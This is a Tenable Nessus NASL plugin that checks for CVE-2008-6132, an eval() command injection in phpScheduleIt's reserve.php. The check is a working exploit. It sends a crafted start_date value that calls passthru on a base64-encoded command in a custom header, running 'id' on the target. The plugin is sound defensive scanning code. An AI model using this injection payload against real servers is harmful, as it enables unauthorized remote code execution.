#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(34338);
  script_version("$Revision: 1.20 $");
  script_cvs_date("$Date: 2016/11/23 20:42:23 $");

  script_cve_id("CVE-2008-6132");
  script_bugtraq_id(31520, 33855);
  script_osvdb_id(48797);
  script_xref(name:"EDB-ID", value:"6646");

  script_name(english:"phpScheduleIt reserve.php start_date Parameter Arbitrary Command Injection");
  script_summary(english:"Tries to run a command using phpScheduleIt");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that allows execution
of arbitrary commands.");
  script_set_attribute(attribute:"description", value:
"The version of phpScheduleIt installed on the remote host fails to
sanitize user-supplied input to the 'start_date' parameter of the
'reserve.php' script before using it in an 'eval()' function call. 
Provided PHP's 'magic_quotes_gpc' is disabled, an unauthenticated,
remote attacker can leverage this issue to execute arbitrary code on
the remote host, subject to the privileges under which the web server
operates.");
   # http://sourceforge.net/project/shownotes.php?group_id=95547&release_id=662749
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?f01c512f");
  script_set_attribute(attribute:"solution", value:
"Upgrade to phpScheduleIt version 1.2.11 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'phpScheduleIt PHP reserve.php start_date Parameter Arbitrary Code Injection');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
  script_cwe_id(94);

  script_set_attribute(attribute:"plugin_publication_date", value:"2008/10/03");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe",value:"cpe:/a:brickhost:phpscheduleit");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2016 Tenable Network Security, Inc.");

  script_dependencies("phpscheduleit_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, php:TRUE);


cmd = "id";
cmd_pat = "uid=[0-9]+.*gid=[0-9]+.*";


# Test an install.
install = get_kb_item(string("www/", port, "/phpscheduleit"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Make sure the affected script exists.
  url = string(dir, "/reserve.php");

  r = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(r)) exit(0);
  res = r[2];

  # If it does...
  if ("return check_reservation_form" >< res)
  {
    # Try to exploit the flaw to run a command.
    fake_srv = string("NESSUS_", toupper(rand_str()));
    postdata = string(
      "btnSubmit=1&",
      "start_date=1').${passthru(base64_decode($_SERVER[HTTP_", fake_srv, "]))}.${die};#"
    );

    r = http_send_recv3(method: "POST", item: url, port: port,
      add_headers: make_array( "Content-Type", "application/x-www-form-urlencoded",
      		   		"Referer", build_url(port:port, qs:url),
				fake_srv, base64(str:cmd)),
	data: postdata);
    if (isnull(r)) exit(0);
    res = r[2];

    lines = egrep(pattern:cmd_pat, string:res);
    if (lines)
    {
      if (report_verbosity)
      {
        output = "";
        foreach line (split(lines))
          output += ereg_replace(pattern:'^[ \t]*', replace:"  ", string:line);

        report = string(
          "\n",
          "Nessus was able to execute the command '", cmd, "' on the remote\n",
          "host to produce the following results :\n",
          "\n",
          output
        );
        security_warning(port:port, extra:report);
      }
      else security_warning(port);
    }
  }
}
